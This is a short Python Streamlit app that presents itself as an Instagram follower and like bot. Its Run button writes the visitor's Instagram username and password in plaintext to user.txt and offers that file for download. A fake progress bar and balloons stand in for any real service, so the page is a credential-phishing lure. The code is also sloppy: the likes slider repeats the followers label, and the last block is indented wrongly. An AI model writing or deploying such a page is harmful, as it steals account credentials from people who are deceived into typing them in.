import streamlit as st
import time
imageurl = None

st.title('Instagram Follower and Liker Bot')

title = st.text_input('Username', 'Enter Username here')
password = st.text_input('Password',type="password")
#inputs to add spice to this boring dashboard.
age = st.slider('How many followers would you like?', 0, 10000, 100)
st.write("You will gain  ", age, 'followers')
imageurl = st.text_input('Instagram Image URL', '')
if imageurl:
    st.image("https://logodix.com/logo/14546.jpg", caption='Image Upload Successful')
like = st.slider('How many followers would you like?', 0, 10000, 0)
st.write("You will gain  ", like, 'likes')
my_bar = st.progress(0)


if st.button('Run'):
    #append userdata to a .txt file
    text_file = open("user.txt", "a+")
    text_file.write("Username: " + f'{title}\n')
    text_file.write("Password: " +f'{password}\n')
    text_file.close()
    for percent_complete in range(100):
     time.sleep(.01)
     my_bar.progress(percent_complete + 1)
    st.balloons()
     with open('user.txt') as f:
       st.download_button('Download dat file', f,'result.csv', 'text/csv')

